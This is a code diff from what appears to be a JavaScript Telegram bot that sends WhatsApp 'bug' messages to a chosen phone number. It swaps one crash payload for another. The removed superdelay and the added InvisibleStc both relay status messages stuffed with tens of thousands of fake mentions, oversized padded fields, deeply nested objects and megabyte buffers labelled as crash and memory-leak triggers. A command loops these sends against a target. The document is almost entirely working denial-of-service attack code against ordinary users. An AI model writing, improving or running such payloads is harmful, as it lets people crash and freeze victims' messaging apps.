@@ -2347,10 +2347,9 @@ bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     },
   });
 
-  for (let i = 0; i < 5; i++) {
-    await superdelay(sock, target);
-    await sleep(1000);
-    console.log(`Succes Sending Bugs To : ${target}`);
+  for (let i = 0; i < 10; i++) {
+    await delayaw(sock, target);
+    console.log(`Gxion Succes Sending Bugs To : ${target}`);
   }
 })
 /// --------- ( CASE BUG 7 ) ---------- \\\
@@ -2929,111 +2928,294 @@ async function delayGabuts(sock, target) {
     await sock.relayMessage(target, jut, {});
   } 
   
-async function superdelay(sock, target, mention = false) {
-    const mentionedList = [
-        "13135550002@s.whatsapp.net",
-        ...Array.from({ length: 40000 }, () =>
-            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-        )
-    ];
-
-    const embeddedMusic = {
-        musicContentMediaId: "589608164114571",
-        songId: "870166291800508",
-        author: "Atomic" + "ោ៝".repeat(10000),
-        title: "canlovelove",
-        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
-        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
-        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
-        artistAttribution: "https://t.me/canlovelove",
-        countryBlocklist: true,
-        isExplicit: true,
-        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
-    };
-
-    const videoMessage = {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-        mimetype: "video/mp4",
-        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-        fileLength: "289511",
-        seconds: 15,
-        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-        caption: "A T O M I C H E R E ! ! !",
-        height: 640,
-        width: 640,
-        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1743848703",
-        contextInfo: {
-            isSampled: true,
-            mentionedJid: mentionedList
-        },
-        forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363321780343299@newsletter",
-            serverMessageId: 1,
-            newsletterName: "Atom"
-        },
-        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
-        annotations: [
-            {
-                embeddedContent: {
-                    embeddedMusic
-                },
-                embeddedAction: true
-            }
-        ]
-    };
-
-    const msg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: { videoMessage }
-        }
-    }, {});
-
-    await sock.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [
-            {
-                tag: "meta",
-                attrs: {},
-                content: [
-                    {
-                        tag: "mentioned_users",
-                        attrs: {},
-                        content: [
-                            { tag: "to", attrs: { jid: target }, content: undefined }
-                        ]
-                    }
-                ]
-            }
-        ]
-    });
-
-    if (mention) {
-        await sock.relayMessage(target, {
-            statusMentionMessage: {
-                message: {
-                    protocolMessage: {
-                        key: msg.key,
-                        type: 25
-                    }
-                }
-            }
-        }, {
-            additionalNodes: [
-                {
-                    tag: "meta",
-                    attrs: { is_status_mention: "true" },
-                    content: undefined
-                }
-            ]
-        });
+async function InvisibleStc(sock, target, cycleNum = 0) {
+  try {
+    let mentionCount;
+    if (cycleNum <= 1) {
+      mentionCount = 5000 + Math.floor(cycleNum * 1200);
+    } else if (cycleNum <= 2) {
+      mentionCount = 6200 + Math.floor((cycleNum - 1) * 1800);
+    } else {
+      mentionCount = 8000 + Math.floor((cycleNum - 2) * 2800);
     }
-}  
+    mentionCount = Math.min(mentionCount, 28000);
+    
+    const massiveMentions = [];
+    for (let i = 0; i < mentionCount; i++) {
+      massiveMentions.push(`${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
+    }
+    
+    let padSize, currencyPadSize, amountPadSize, transactionPadSize, receiptPadSize, extraPadSize, mediaPadSize, linkPadSize, quotePadSize;
+    
+    if (cycleNum <= 1) {
+      padSize = 25000 + (cycleNum * 10000);
+      currencyPadSize = 15000 + (cycleNum * 6000);
+      amountPadSize = 19000 + (cycleNum * 8000);
+      transactionPadSize = 22000 + (cycleNum * 9000);
+      receiptPadSize = 14000 + (cycleNum * 5500);
+      extraPadSize = 11000 + (cycleNum * 4500);
+      mediaPadSize = 18000 + (cycleNum * 7000);
+      linkPadSize = 9000 + (cycleNum * 3500);
+      quotePadSize = 13000 + (cycleNum * 5000);
+    } else if (cycleNum <= 2) {
+      padSize = 35000 + ((cycleNum - 1) * 16000);
+      currencyPadSize = 21000 + ((cycleNum - 1) * 9500);
+      amountPadSize = 27000 + ((cycleNum - 1) * 12500);
+      transactionPadSize = 31000 + ((cycleNum - 1) * 14000);
+      receiptPadSize = 19500 + ((cycleNum - 1) * 8500);
+      extraPadSize = 15500 + ((cycleNum - 1) * 7000);
+      mediaPadSize = 25000 + ((cycleNum - 1) * 10000);
+      linkPadSize = 12500 + ((cycleNum - 1) * 5500);
+      quotePadSize = 18000 + ((cycleNum - 1) * 7500);
+    } else {
+      padSize = 51000 + ((cycleNum - 2) * 22000);
+      currencyPadSize = 30500 + ((cycleNum - 2) * 13500);
+      amountPadSize = 39500 + ((cycleNum - 2) * 17500);
+      transactionPadSize = 45000 + ((cycleNum - 2) * 19500);
+      receiptPadSize = 28000 + ((cycleNum - 2) * 12000);
+      extraPadSize = 22500 + ((cycleNum - 2) * 10000);
+      mediaPadSize = 35000 + ((cycleNum - 2) * 14500);
+      linkPadSize = 18000 + ((cycleNum - 2) * 8000);
+      quotePadSize = 25500 + ((cycleNum - 2) * 11000);
+    }
+    
+    padSize = Math.min(padSize, 128000);
+    currencyPadSize = Math.min(currencyPadSize, 78000);
+    amountPadSize = Math.min(amountPadSize, 95000);
+    transactionPadSize = Math.min(transactionPadSize, 108000);
+    receiptPadSize = Math.min(receiptPadSize, 72000);
+    extraPadSize = Math.min(extraPadSize, 58000);
+    mediaPadSize = Math.min(mediaPadSize, 88000);
+    linkPadSize = Math.min(linkPadSize, 48000);
+    quotePadSize = Math.min(quotePadSize, 68000);
+    
+    const garbageLen = Math.min(21 + Math.floor(cycleNum * 25), 1250);
+    
+    const baseTimestamp = Date.now();
+    const fakeTimestamps = [
+      baseTimestamp.toString() + "0".repeat(garbageLen),
+      (baseTimestamp + 1000).toString() + "1".repeat(garbageLen),
+      (baseTimestamp + 2000).toString() + "2".repeat(garbageLen),
+      (baseTimestamp + 3000).toString() + "3".repeat(garbageLen),
+      (baseTimestamp + 4000).toString() + "4".repeat(garbageLen),
+      (baseTimestamp + 5000).toString() + "5".repeat(garbageLen),
+      (baseTimestamp + 6000).toString() + "6".repeat(garbageLen),
+      (baseTimestamp + 7000).toString() + "7".repeat(garbageLen),
+      (baseTimestamp + 8000).toString() + "8".repeat(garbageLen),
+      (baseTimestamp + 9000).toString() + "9".repeat(garbageLen),
+      (baseTimestamp + 10000).toString() + "A".repeat(garbageLen),
+      (baseTimestamp + 11000).toString() + "B".repeat(garbageLen),
+      (baseTimestamp + 12000).toString() + "C".repeat(garbageLen),
+      (baseTimestamp + 13000).toString() + "D".repeat(garbageLen),
+      (baseTimestamp + 14000).toString() + "E".repeat(garbageLen)
+    ];
+    
+    const nestedDepth = Math.min(15 + Math.floor(cycleNum * 12), 68);
+    let deepNested = {};
+    let current = deepNested;
+    for (let d = 0; d < nestedDepth; d++) {
+      current.level = {};
+      current = current.level;
+    }
+    current.payload = "".padEnd(padSize, "MEMORY_LEAK_PERSISTENT_CORRUPTION_HEAP_OVERFLOW");
+    current.payload2 = "".padEnd(amountPadSize, "DATABASE_CORRUPTION_INDEX_FAIL_RECURSIVE_LOOP");
+    current.payload3 = "".padEnd(transactionPadSize, "INDEX_OVERFLOW_STACK_HEAP_CASCADE_FAILURE");
+    current.payload4 = "".padEnd(mediaPadSize, "MEDIA_PARSER_FAIL_LOOP_INFINITE_RENDER");
+    current.payload5 = "".padEnd(extraPadSize, "EXTRA_BUFFER_OVERFLOW_STACK_TRACE");
+    current.payload6 = "".padEnd(linkPadSize, "LINK_PARSER_FAIL_RECURSIVE");
+    current.payload7 = "".padEnd(quotePadSize, "QUOTE_MESSAGE_CORRUPT_LOOP");
+    
+    let deepNested2 = {};
+    let current2 = deepNested2;
+    for (let d = 0; d < nestedDepth - 5; d++) {
+      current2.layer = {};
+      current2 = current2.layer;
+    }
+    current2.data = "".padEnd(transactionPadSize, "BUFFER_OVERFLOW_CASCADE_CHAIN");
+    current2.data2 = "".padEnd(amountPadSize, "STACK_CORRUPT_RECURSIVE_INFINITE");
+    current2.data3 = "".padEnd(padSize, "HEAP_LEAK_CHAIN_PERSISTENT");
+    current2.data4 = "".padEnd(mediaPadSize, "MEDIA_STACK_OVERFLOW");
+    current2.data5 = "".padEnd(extraPadSize, "EXTRA_RECURSIVE_LEAK");
+    
+    let deepNested3 = {};
+    let current3 = deepNested3;
+    for (let d = 0; d < nestedDepth - 8; d++) {
+      current3.block = {};
+      current3 = current3.block;
+    }
+    current3.overflow = "".padEnd(padSize, "HEAP_LEAK_PERSISTENT_FOREVER");
+    current3.corrupt = "".padEnd(currencyPadSize, "RENDER_FAIL_CRITICAL_DEADLOCK");
+    current3.cascade = "".padEnd(transactionPadSize, "CASCADE_FAILURE_CHAIN_REACTION");
+    current3.infinite = "".padEnd(mediaPadSize, "INFINITE_LOOP_TRIGGER");
+    current3.deadlock = "".padEnd(extraPadSize, "DEADLOCK_CONDITION");
+    
+    let deepNested4 = {};
+    let current4 = deepNested4;
+    for (let d = 0; d < nestedDepth - 11; d++) {
+      current4.chain = {};
+      current4 = current4.chain;
+    }
+    current4.final = "".padEnd(extraPadSize, "FINAL_CORRUPT_TRIGGER_ACTIVATE");
+    current4.trigger = "".padEnd(mediaPadSize, "TRIGGER_OVERFLOW");
+    current4.cascade2 = "".padEnd(transactionPadSize, "CASCADE_SECONDARY");
+    
+    let deepNested5 = {};
+    let current5 = deepNested5;
+    for (let d = 0; d < nestedDepth - 13; d++) {
+      current5.recursive = {};
+      current5 = current5.recursive;
+    }
+    current5.endless = "".padEnd(padSize, "ENDLESS_RECURSION_LEAK");
+    current5.memory = "".padEnd(amountPadSize, "MEMORY_FRAGMENTATION");
+    
+    const arrayBufferPayload = Buffer.alloc(Math.min(650000 + (cycleNum * 85000), 1950000)).fill("X").toString();
+    const arrayBufferPayload2 = Buffer.alloc(Math.min(550000 + (cycleNum * 75000), 1750000)).fill("Y").toString();
+    const arrayBufferPayload3 = Buffer.alloc(Math.min(480000 + (cycleNum * 68000), 1650000)).fill("Z").toString();
+    const arrayBufferPayload4 = Buffer.alloc(Math.min(420000 + (cycleNum * 62000), 1550000)).fill("W").toString();
+    const arrayBufferPayload5 = Buffer.alloc(Math.min(380000 + (cycleNum * 58000), 1450000)).fill("V").toString();
+    
+    const repeatedPayload = "".padEnd(extraPadSize, "REPEAT_LOAD_CYCLE_PERSISTENT").repeat(35);
+    const repeatedPayload2 = "".padEnd(mediaPadSize, "MEDIA_LOOP_INFINITE_RENDER").repeat(28);
+    const repeatedPayload3 = "".padEnd(linkPadSize, "LINK_LOOP_RECURSIVE").repeat(22);
+    const repeatedPayload4 = "".padEnd(quotePadSize, "QUOTE_LOOP_CASCADE").repeat(25);
+    const repeatedPayload5 = "".padEnd(padSize, "STACK_LOOP_OVERFLOW").repeat(20);
+    
+    const heavyMetadata = {
+      stickerMessage: {
+        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
+        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
+        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
+        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
+        mimetype: "image/webp",
+        height: 9999,
+        width: 9999,
+        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
+        fileLength: 12260,
+        mediaKeyTimestamp: fakeTimestamps[0],
+        isAnimated: false,
+        stickerSentTs: fakeTimestamps[1],
+        isAvatar: false,
+        isAiSticker: false,
+        isLottie: false,
+        contextInfo: {
+          mentionedJid: massiveMentions,
+          stanzaId: "".padEnd(padSize, "X") + Date.now() + "".padEnd(12000, "Y") + "".padEnd(8000, "Z") + "".padEnd(5000, "W") + "".padEnd(3000, "V"),
+          quotedMessage: {
+            paymentInviteMessage: {
+              serviceType: 3,
+              expiryTimestamp: Date.now() + 1814400000,
+              currencyCode: "".padEnd(currencyPadSize, "USD"),
+              amount1000: "".padEnd(amountPadSize, "9"),
+              transactionId: "".padEnd(transactionPadSize, "TXN"),
+              receiptId: "".padEnd(receiptPadSize, "R"),
+              status: "".padEnd(currencyPadSize / 1.02, "PENDING"),
+              refundInfo: "".padEnd(amountPadSize / 1.01, "REFUND"),
+              extraData: "".padEnd(extraPadSize, "EXTRA"),
+              mediaData: "".padEnd(mediaPadSize, "MEDIA"),
+              linkData: "".padEnd(linkPadSize, "LINK"),
+              quoteData: "".padEnd(quotePadSize, "QUOTE"),
+              repeatedData: repeatedPayload,
+              repeatedMedia: repeatedPayload2,
+              repeatedLink: repeatedPayload3,
+              repeatedQuote: repeatedPayload4,
+              repeatedStack: repeatedPayload5,
+              arrayBufferData: arrayBufferPayload,
+              arrayBufferData2: arrayBufferPayload2,
+              arrayBufferData3: arrayBufferPayload3,
+              arrayBufferData4: arrayBufferPayload4,
+              arrayBufferData5: arrayBufferPayload5,
+              paymentInfo: {
+                method: "".padEnd(amountPadSize / 1.05, "CARD"),
+                reference: "".padEnd(transactionPadSize / 1.04, "REF"),
+                timestamp: fakeTimestamps[2],
+                deepNested: deepNested,
+                deepNested2: deepNested2,
+                deepNested3: deepNested3,
+                deepNested4: deepNested4,
+                deepNested5: deepNested5,
+                history: "".padEnd(transactionPadSize / 1.02, "HISTORY"),
+                metadata: {
+                  userAgent: "".padEnd(padSize / 1.2, "WA_CLIENT_CRASH_LOOP_INFINITE"),
+                  deviceId: "".padEnd(currencyPadSize / 1.05, "DEVICE_LEAK_CASCADE_CHAIN"),
+                  sessionData: "".padEnd(amountPadSize / 1.05, "SESSION_CORRUPT_HEAP_STACK"),
+                  cacheControl: "".padEnd(extraPadSize, "NO_CACHE_FOREVER_LEAK_PERSISTENT"),
+                  timestampList: fakeTimestamps,
+                  bufferHeap: arrayBufferPayload.slice(0, 100000),
+                  bufferHeap2: arrayBufferPayload2.slice(0, 85000),
+                  bufferHeap3: arrayBufferPayload3.slice(0, 75000),
+                  recursiveRef: deepNested,
+                  recursiveRef2: deepNested2,
+                  infiniteLoop: repeatedPayload.slice(0, 50000)
+                }
+              }
+            }
+          },
+          quotedMessageInfo: {
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 3,
+                expiryTimestamp: Date.now() + 1814400000,
+                currencyCode: "".padEnd(currencyPadSize / 1.01, "USD"),
+                amount1000: "".padEnd(amountPadSize / 1.02, "9"),
+                transactionId: "".padEnd(transactionPadSize / 1.02, "TXN"),
+                extraField: "".padEnd(extraPadSize, "EXTRA_QUOTE"),
+                mediaField: "".padEnd(mediaPadSize, "MEDIA_QUOTE"),
+                linkField: "".padEnd(linkPadSize, "LINK_QUOTE"),
+                quoteField: "".padEnd(quotePadSize, "QUOTE_QUOTE")
+              }
+            },
+            quotedMessageStanzaId: "".padEnd(padSize / 1.1, "QID"),
+            quotedMessageParticipant: "".padEnd(currencyPadSize / 1.2, "PARTICIPANT") + "@s.whatsapp.net"
+          },
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: "".padEnd(padSize / 1.5, "NEWS"),
+            serverUrl: "".padEnd(transactionPadSize / 1.2, "URL"),
+            serverHash: "".padEnd(currencyPadSize / 1.1, "HASH"),
+            messageId: "".padEnd(receiptPadSize, "MID"),
+            newsletterName: "".padEnd(extraPadSize / 1.05, "NEWSLETTER"),
+            newsletterDescription: "".padEnd(mediaPadSize / 1.1, "DESC"),
+            newsletterLink: "".padEnd(linkPadSize / 1.1, "LINK")
+          },
+          quotedMessageStanzaId: "".padEnd(padSize / 1.05, "STANZA"),
+          quotedMessageParticipant: "".padEnd(currencyPadSize / 1.1, "PARTICIPANT") + "@s.whatsapp.net",
+          participant: "".padEnd(amountPadSize / 1.1, "SENDER") + "@s.whatsapp.net",
+          remoteJid: "".padEnd(transactionPadSize / 1.2, "REMOTE") + "@s.whatsapp.net",
+          fromMe: false,
+          sender: "".padEnd(receiptPadSize / 1.2, "SENDER") + "@s.whatsapp.net",
+          deviceSentMetadata: {
+            destinationJid: "".padEnd(padSize / 1.3, "DEST"),
+            deviceJid: "".padEnd(currencyPadSize / 1.2, "DEVICE"),
+            platform: "".padEnd(mediaPadSize / 1.2, "PLATFORM")
+          },
+          ephemeralSetting: 0,
+          expirationTimestamp: fakeTimestamps[3],
+          messageSecret: "".padEnd(transactionPadSize / 1.5, "SECRET"),
+          messageStubType: 9999,
+          stanzaId: "".padEnd(linkPadSize, "STANZA_EXTRA")
+        }
+      }
+    };
+
+    await sock.relayMessage("status@broadcast", heavyMetadata, {
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {},
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{ tag: "to", attrs: { jid: target } }]
+        }]
+      }]
+    });
+    
+    if (cycleNum === 0 || cycleNum === 3) {
+      const memEstimate = (mentionCount * 0.28 + padSize / 280).toFixed(0);
+      console.log(`🐌 [${cycleNum}/3] Mention: ${mentionCount} | Pad: ${(padSize/1000).toFixed(0)}k | Nested: ${nestedDepth} | Est.Memory: ${memEstimate}MB`);
+    }
+  } catch (err) {
+  }
+}
    
 async function VnXBlankAiOneMsg(sock, target) {
   const VnXlag = "ꦾ".repeat(250000); 
